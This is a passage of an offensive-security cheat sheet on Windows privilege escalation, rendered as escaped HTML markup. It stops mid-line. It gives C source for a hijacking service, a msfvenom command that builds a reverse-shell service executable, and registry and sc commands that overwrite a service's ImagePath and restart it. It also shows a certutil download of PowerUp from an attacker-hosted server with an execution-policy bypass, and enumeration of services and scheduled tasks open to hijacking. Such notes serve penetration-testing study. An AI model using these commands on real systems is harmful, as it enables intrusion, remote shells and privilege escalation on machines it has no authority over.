class=\"pl-s1\"\u003eServiceTable\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e];\n    \u003cspan class=\"pl-s1\"\u003eServiceTable\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e].\u003cspan class=\"pl-c1\"\u003elpServiceName\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"Derp\"\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceTable\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e].\u003cspan class=\"pl-c1\"\u003elpServiceProc\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003eLPSERVICE_MAIN_FUNCTION\u003c/span\u003e)\u003cspan class=\"pl-s1\"\u003eServiceMain\u003c/span\u003e;\n\n    \u003cspan class=\"pl-s1\"\u003eServiceTable\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e].\u003cspan class=\"pl-c1\"\u003elpServiceName\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceTable\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e].\u003cspan class=\"pl-c1\"\u003elpServiceProc\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e;\n\n    \u003cspan class=\"pl-en\"\u003eStartServiceCtrlDispatcher\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eServiceTable\u003c/span\u003e);\n    \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n}\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eServiceMain\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003eint\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eargc\u003c/span\u003e, \u003cspan class=\"pl-smi\"\u003echar\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eargv\u003c/span\u003e)\n{\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwServiceType\u003c/span\u003e        \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_WIN32\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwCurrentState\u003c/span\u003e       \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_START_PENDING\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwControlsAccepted\u003c/span\u003e   \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_ACCEPT_STOP\u003c/span\u003e | \u003cspan class=\"pl-c1\"\u003eSERVICE_ACCEPT_SHUTDOWN\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwWin32ExitCode\u003c/span\u003e      \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwServiceSpecificExitCode\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwCheckPoint\u003c/span\u003e         \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwWaitHint\u003c/span\u003e           \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n\n    \u003cspan class=\"pl-s1\"\u003ehStatus\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eRegisterServiceCtrlHandler\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"Derp\"\u003c/span\u003e, (\u003cspan class=\"pl-smi\"\u003eLPHANDLER_FUNCTION\u003c/span\u003e)\u003cspan class=\"pl-s1\"\u003eControlHandler\u003c/span\u003e);\n    \u003cspan class=\"pl-en\"\u003eRun\u003c/span\u003e();\n\n    \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwCurrentState\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_RUNNING\u003c/span\u003e;\n    \u003cspan class=\"pl-en\"\u003eSetServiceStatus\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003ehStatus\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e);\n\n    \u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwCurrentState\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_RUNNING\u003c/span\u003e)\n    {\n\t\t\u003cspan class=\"pl-en\"\u003eSleep\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003eSLEEP_TIME\u003c/span\u003e);\n    }\n    \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e;\n}\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eControlHandler\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003eDWORD\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequest\u003c/span\u003e)\n{\n    \u003cspan class=\"pl-k\"\u003eswitch\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003erequest\u003c/span\u003e)\n    {\n        \u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_CONTROL_STOP\u003c/span\u003e:\n\t\t\t\u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwWin32ExitCode\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n            \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwCurrentState\u003c/span\u003e  \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_STOPPED\u003c/span\u003e;\n            \u003cspan class=\"pl-en\"\u003eSetServiceStatus\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003ehStatus\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e);\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e;\n\n        \u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_CONTROL_SHUTDOWN\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwWin32ExitCode\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n            \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwCurrentState\u003c/span\u003e  \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSERVICE_STOPPED\u003c/span\u003e;\n            \u003cspan class=\"pl-en\"\u003eSetServiceStatus\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003ehStatus\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e);\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e;\n\n        \u003cspan class=\"pl-k\"\u003edefault\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e;\n    }\n    \u003cspan class=\"pl-en\"\u003eSetServiceStatus\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003ehStatus\u003c/span\u003e,  \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e);\n    \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e;\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCompile with \u003ccode\u003ex86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe\u003c/code\u003e, then\nupload winsvc.exe to \u003ccode\u003e%temp%\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, create a Service EXE with msfvenom.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"msfvenom -p windows/shell_reverse_tcp -f exe-service --service-name \u0026quot;Derp\u0026quot; -o winsvc.exe lport=443 lhost=tun0\"\u003e\u003cpre\u003emsfvenom -p windows/shell_reverse_tcp -f exe-service --service-name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDerp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -o winsvc.exe lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen install and invoke the service:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# overwrite regsvc execution path\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d %temp%\\winsvc.exe /f\n# restart regsvc\nsc start regsvc\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e overwrite regsvc execution path\u003c/span\u003e\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev ImagePath \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_EXPAND_SZ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003etemp\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\\u003cspan class=\"pl-c1\"\u003ewinsvc.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restart regsvc\u003c/span\u003e\nsc start regsvc\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.3 Windows Binary Hijacking\u003c/h3\u003e\u003ca id=\"user-content-423-windows-binary-hijacking\" class=\"anchor\" aria-label=\"Permalink: 4.2.3 Windows Binary Hijacking\" href=\"#423-windows-binary-hijacking\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: Listing services requires interactive logon via RDP. You will get a \"not authorized\" error through WinRM or bind/reverse shell!!\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThis privesc vector works by overwriting the executable file for Windows Services, Scheduled Tasks, and AutoRuns. Service hijacking, Scheduled Tasks hijacking, and AutoRuns hijacking.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eYou can automate the search for the privesc vector with PowerUp:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on kali, serve up PowerUp.ps1\ncp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .\nsudo python -m http.server 80\n\n# on victim\ncertutil -urlcache -split -f http://LISTEN_IP/PowerUp.ps1\npowershell -ep bypass\n. .\\PowerUp.ps1\nGet-ModifiableService # can change binpath\nGet-ModifiableServiceFile # can overwrite executable file\nGet-ModifiableRegistryAutoRun # can modify executable file/path\nGet-ModifiableScheduledTaskFile # can modify task executable\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali, serve up PowerUp.ps1\u003c/span\u003e\ncp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\nsudo python -m http.server 80\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on victim\u003c/span\u003e\ncertutil -urlcache -split -f http://LISTEN_IP/PowerUp.ps1\npowershell -ep bypass\n\u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e .\u003cspan class=\"pl-cce\"\u003e\\P\u003c/span\u003eowerUp.ps1\nGet-ModifiableService \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can change binpath\u003c/span\u003e\nGet-ModifiableServiceFile \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can overwrite executable file\u003c/span\u003e\nGet-ModifiableRegistryAutoRun \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can modify executable file/path\u003c/span\u003e\nGet-ModifiableScheduledTaskFile \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can modify task executable\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo find the vulnerability manually:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFirst look for running services with paths outside \u003ccode\u003eC:\\Windows\\System32\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Get-CimInstance supercedes Get-WmiObject\nGet-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\\Windows\\System32\\*'} | select Name,PathName\n# alternatively\nwmic service where \u0026quot;started=true and not pathname like 'C:\\\\Windows\\\\System32\\\\%'\u0026quot; get name,pathname\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get-CimInstance supercedes Get-WmiObject\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CimInstance\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eClassName win32_service \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e {\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.State\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-like\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eRunning\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.PathName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\Windows\\System32\\*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e} \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select Name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003ePathName\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternatively\u003c/span\u003e\nwmic service \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003estarted=true and not pathname like 'C:\\\\Windows\\\\System32\\\\%'\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e get name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003epathname\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere's how to look for Scheduled Tasks:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$header=\u0026quot;HostName\u0026quot;,\u0026quot;TaskName\u0026quot;,\u0026quot;NextRunTime\u0026quot;,\u0026quot;Status\u0026quot;,\u0026quot;LogonMode\u0026quot;,\u0026quot;LastRunTime\u0026quot;,\u0026quot;LastResult\u0026quot;,\u0026quot;Author\u0026quot;,\u0026quot;TaskToRun\u0026quot;,\u0026quot;StartIn\u0026quot;,\u0026quot;Comment\u0026quot;,\u0026quot;ScheduledTaskState\u0026quot;,\u0026quot;IdleTime\u0026quot;,\u0026quot;PowerManagement\u0026quot;,\u0026quot;RunAsUser\u0026quot;,\u0026quot;DeleteTaskIfNotRescheduled\u0026quot;,\u0026quot;StopTaskIfRunsXHoursandXMins\u0026quot;,\u0026quot;Schedule\u0026quot;,\u0026quot;ScheduleType\u0026quot;,\u0026quot;StartTime\u0026quot;,\u0026quot;StartDate\u0026quot;,\u0026quot;EndDate\u0026quot;,\u0026quot;Days\u0026quot;,\u0026quot;Months\u0026quot;,\u0026quot;RepeatEvery\u0026quot;,\u0026quot;RepeatUntilTime\u0026quot;,\u0026quot;RepeatUntilDuration\u0026quot;,\u0026quot;RepeatStopIfStillRunning\u0026quot;\nschtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike \u0026quot;%windir%*\u0026quot; -and $_.TaskToRun -ne \u0026quot;COM handler\u0026quot; -and $_.TaskToRun -notlike \u0026quot;%systemroot%*\u0026quot; -and $_.TaskToRun -notlike \u0026quot;C:\\Windows\\*\u0026quot; -and $_.TaskName -notlike \u0026quot;\\Microsoft\\Windows\\*\u0026quot;}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$header\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHostName\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eTaskName\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eNextRunTime\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eStatus\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLogonMode\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLastRunTime\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLastResult\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAuthor\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eTaskToRun\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eStartIn\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eComment\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eScheduledTaskState\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eIdleTime\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePowerManagement\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRunAsUser\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDeleteTaskIfNotRescheduled\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eStopTaskIfRunsXHoursandXMins\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSchedule\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eScheduleType\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eStartTime\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eStartDate\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eEndDate\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDays\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eMonths\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRepeatEvery\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRepeatUntilTime\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRepeatUntilDuration\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRepeatStopIfStillRunning\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nschtasks \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003equery \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003efo csv \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003enh \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eConvertFrom-Csv\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eHeader \u003cspan class=\"pl-smi\"\u003e$header\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euniq TaskName\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eNextRunTime\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eStatus\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eTaskToRun\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eRunAsUser \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e {\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.RunAsUser\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-ne\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$\u003cspan 